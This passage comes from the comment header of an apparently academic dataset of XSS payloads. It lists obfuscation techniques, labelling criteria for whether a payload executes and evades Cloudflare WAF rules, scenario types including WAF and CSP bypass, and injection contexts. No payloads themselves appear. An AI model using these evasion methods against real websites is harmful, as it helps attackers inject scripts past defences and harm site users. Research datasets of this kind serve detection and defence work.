#    - String Concatenation: Runtime construction of blocked keywords
#    - Template Literals: ES6 syntax to avoid parentheses matching
#    - Bracket Notation: Indirect function invocation via property access
#    - Function Constructor: Dynamic code generation via Function()
#    - SVG/MathML Elements: Foreign namespace event handlers
#
# 3. LABELING CRITERIA
#    "valid" label criteria (all must be met):
#      - The payload produces syntactically correct HTML/JS after all
#        applicable decoding stages in the specified target context
#      - A standards-compliant browser (Chrome/Firefox latest) would parse
#        and execute the JavaScript payload
#      - The encoding/obfuscation technique is expected to evade Cloudflare
#        WAF managed rules (based on documented bypass research as of 2024)
#
#    "invalid" label criteria (any one is sufficient):
#      - The encoding produces characters that the browser does not decode
#        in the specified context (e.g., Unicode escapes for HTML tags)
#      - The WAF successfully detects and blocks the payload despite encoding
#      - The HTML is malformed in a way that prevents browser parsing
#      - The targeted browser API/element is deprecated or removed
#      - CSP or other security headers prevent execution
#
# 4. VALID/INVALID RATIO
#    The dataset maintains approximately 60% valid to 40% invalid payloads.
#    This ratio reflects real-world attack scenarios where a significant
#    portion of evasion attempts fail due to incorrect encoding application,
#    WAF rule updates, or browser security improvements.
#
# 5. SCENARIO TYPES
#    Each payload is tagged with an attack scenario:
#    - Reflected XSS: Server reflects user input without sanitization
#    - Stored XSS: Payload persisted in database and rendered to users
#    - DOM-based XSS: Client-side JS manipulates DOM with tainted data
#    - CSP Bypass: Attempts to circumvent Content Security Policy
#    - Cloudflare WAF Bypass: Direct evasion of Cloudflare managed rules
#
# 6. TARGET CONTEXTS
#    Injection points are classified as:
#    - HTML attribute: Payload injected into attribute values
#    - script block: Payload injected into existing <script> elements
#    - URL parameter: Payload delivered via query string or URL fragment
#    - innerHTML: Payload assigned via DOM innerHTML property
#
# 7. LIMITATIONS AND ETHICAL CONSIDERATIONS
#    - This dataset is for ACADEMIC RESEARCH PURPOSES ONLY
#    - WAF bypass effectiveness may vary with Cloudflare rule updates
#    - Payloads should only be tested in authorized lab environments
#    - The labeling reflects theoretical analysis; actual bypass success
#      depends on specific WAF configuration and rule sensitivity levels
#
# ===========================================================================
